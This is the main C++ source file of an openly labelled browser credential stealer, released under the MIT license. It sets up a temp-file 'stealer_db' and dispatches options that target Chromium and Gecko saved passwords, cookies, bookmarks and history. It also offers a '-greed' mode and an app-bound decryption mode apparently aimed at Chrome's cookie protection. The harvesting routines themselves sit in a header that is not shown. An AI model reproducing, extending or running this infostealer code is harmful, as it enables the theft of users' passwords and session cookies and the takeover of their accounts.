/*
 * � 2024 Shayan Ahmed Khan - shaddy43
 *
 * This software is provided under the MIT License.
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software
 * and associated documentation files (the "Software"), to deal in the Software without restriction,
 * including without limitation the rights to use, copy, modify, merge, publish, distribute,
 * sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all copies or
 * substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
 * BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
 * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
 * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS

#include "includes/Visualizer.h"
std::string stealer_db;

void init_stealer_db()
{
	std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	srand(time(0)); // Seed the random number generator with current time
	for (int i = 0; i < 6; ++i) {
		stealer_db += characters[rand() % characters.length()];
	}

	std::filesystem::path temp_path = std::filesystem::temp_directory_path();
	stealer_db = temp_path.string() + stealer_db;
}

int main(int argc, char* argv[])
{
	std::string converted_username;
	wchar_t username[MAX_PATH];
	DWORD size = MAX_PATH;
	if (GetUserName(username, &size))
	{
		std::wstring_convert <std::codecvt_utf8<wchar_t>> converter;
		converted_username = converter.to_bytes(username);
	}

	init_stealer_db();
	Visualizer visualizer(converted_username, stealer_db);

    if (argc == 1) {
        if (!visualizer.default_settings(converted_username, stealer_db))
            return -1;
    }
    else if (std::string(argv[1]) == "-console-mode") {
        // Console mode visualization
        visualizer.visualization_main();
    }
    else if (std::string(argv[1]) == "-h") {
        visualizer.displayHelp();
    }
    else if (std::string(argv[1]) == "-pass") {
        // Handle -pass options
        if (argc > 2) {
            if (std::string(argv[2]) == "-c") {
                std::cout << "Target Chromium Browser passwords...\n";
                visualizer.handler(1, "");
            }
            else if (std::string(argv[2]) == "-g") {
                std::cout << "Target Gecko Browser passwords...\n";
                visualizer.handler(2, "");
            }
            else {
                std::cout << "Invalid option for -pass. Use -h for help.\n";
            }
        }
        else {
            std::cout << "Target all browser passwords...\n";
            visualizer.handler(3, "");
        }
    }
    else if (std::string(argv[1]) == "-cookies") {
        // Handle -cookies options
        if (argc > 2) {
            if (std::string(argv[2]) == "-c") {
                std::cout << "Target Chromium Browser cookies...\n";
                visualizer.handler(4, "");
            }
            else if (std::string(argv[2]) == "-g") {
                std::cout << "Target Gecko Browser cookies...\n";
                visualizer.handler(5, "");
            }
            else {
                std::cout << "Invalid option for -cookies. Use -h for help.\n";
            }
        }
        else {
            std::cout << "Target all browser cookies...\n";
            visualizer.handler(6, "");
        }
    }
    else if (std::string(argv[1]) == "-bookmarks") {
        // Handle -bookmark options
        if (argc > 2) {
            if (std::string(argv[2]) == "-c") {
                std::cout << "Target Chromium Browser bookmarks...\n";
                visualizer.handler(7, "");
            }
            else if (std::string(argv[2]) == "-g") {
                std::cout << "Target Gecko Browser bookmarks...\n";
                visualizer.handler(8, "");
            }
            else {
                std::cout << "Invalid option for -bookmarks. Use -h for help.\n";
            }
        }
        else {
            std::cout << "Target all browser bookmarks...\n";
            visualizer.handler(9, "");
        }
    }
    else if (std::string(argv[1]) == "-history") {
        // Handle -bookmark options
        if (argc > 2) {
            if (std::string(argv[2]) == "-c") {
                std::cout << "Target Chromium Browser history...\n";
                visualizer.handler(10, "");
            }
            else if (std::string(argv[2]) == "-g") {
                std::cout << "Target Gecko Browser history...\n";
                visualizer.handler(11, "");
            }
            else {
                std::cout << "Invalid option for -history. Use -h for help.\n";
            }
        }
        else {
            std::cout << "Target all browser history...\n";
            visualizer.handler(12, "");
        }
    }
    else if (std::string(argv[1]) == "-greed") {
        //Handle -greed
        visualizer.handler(13, "");
    }
    else if (std::string(argv[1]) == "-app-bound-decryption")
    {
        if (argc > 2)
        {
            if (std::string(argv[2]) == "-service")
            {
                if (argc > 3)
                    visualizer.handler(15, std::string(argv[3]));
                else
                    exit(1);
            }
            else
            {
                std::cout << "Invalid option for -app-bound-decryption. Use -h for help.\n";
            } 
        }
        else
        {
            visualizer.handler(14, "");
        }
    }
    else {
        std::cout << "Invalid parameter. Use -h for help.\n";
    }
	return 0;
}